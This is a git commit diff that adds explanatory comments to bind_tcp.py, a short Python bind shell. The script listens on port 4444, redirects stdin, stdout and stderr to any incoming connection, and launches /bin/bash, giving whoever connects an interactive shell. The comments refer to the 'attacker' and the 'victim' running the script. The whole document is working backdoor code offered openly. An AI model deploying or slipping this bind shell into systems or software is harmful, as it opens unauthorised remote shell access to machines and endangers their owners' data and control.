ec5df4f39d42c8c1b70112cf9c38d5e8a18c7164
troykkt <troydkent@gmail.com>
2016-06-24 17:03:52 -0400

    commented

--- bind_tcp.py
+++ bind_tcp.py
@@ -6,17 +6,17 @@ import sys
 import subprocess
 
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creating socket using socket python socket library
 
-s.bind(('',int(sys.argv[1])))
+s.bind(('',4444)) # bind to port 4444
+#s.bind(('',int(sys.argv[1]))) <-- same as above, but allows you to pass port as an argument to the script rather than being hardcoded
 
+s.listen(10) # listen for connections made to socket
 
-s.listen(10)
-
-while 1:
-    connection,address = s.accept()
-    data = connection.recv(1024)
-    os.dup2(connection.fileno(),0)
-    os.dup2(connection.fileno(),1)
-    os.dup2(connection.fileno(),2)
-    subprocess.call(['/bin/bash','-i'])
+while 1: # infinite loop
+    connection,address = s.accept() #accept connection, 'conection' variable is a socket object and 'address' is the address that connected to the victim running this script
+    data = connection.recv(1024) # receive data from the attacker
+    os.dup2(connection.fileno(),0) # duplicate stdin to the connection
+    os.dup2(connection.fileno(),1) # duplicate stdout to the connection
+    os.dup2(connection.fileno(),2) # duplicate stderr to the connection
+    subprocess.call(['/bin/bash']) # call /bin/bash
